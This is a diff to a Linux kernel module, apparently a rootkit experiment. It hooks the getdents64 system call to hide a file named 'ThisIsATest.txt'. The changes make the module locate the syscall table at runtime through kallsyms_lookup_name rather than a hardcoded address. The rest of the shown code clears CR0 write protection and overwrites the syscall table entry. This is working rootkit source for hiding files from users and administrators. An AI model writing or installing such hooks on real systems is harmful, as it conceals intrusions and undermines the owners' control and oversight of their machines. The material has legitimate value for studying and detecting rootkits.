@@ -1,4 +1,6 @@
 #include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/kallsyms.h>
 #include <linux/dirent.h>
 #include <asm/cacheflush.h>
 #include <linux/uaccess.h>
@@ -8,7 +10,7 @@
 // Types & other consts.
 typedef int (*original_getdents64_t)(const struct pt_regs *regs);
 static original_getdents64_t original_getdents64_ptr;
-static unsigned long *syscall_table = (unsigned long *)0xffffffff834001a0; 
+static unsigned long *syscall_table; 
 static char *file_name_to_hide = "ThisIsATest.txt";
  
 static inline void wp_cr0(unsigned long val) {
@@ -73,6 +75,7 @@ int new_getdents64(const struct pt_regs *regs) {
 int load(void) {
     printk(KERN_ALERT "Initializing...");
     zero_cr0();
+    syscall_table = kallsyms_lookup_name("sys_call_table");
     original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
     syscall_table[__NR_getdents64] = (long unsigned int)new_getdents64;
     printk(KERN_ALERT "Overrided getdents64 ptr!");
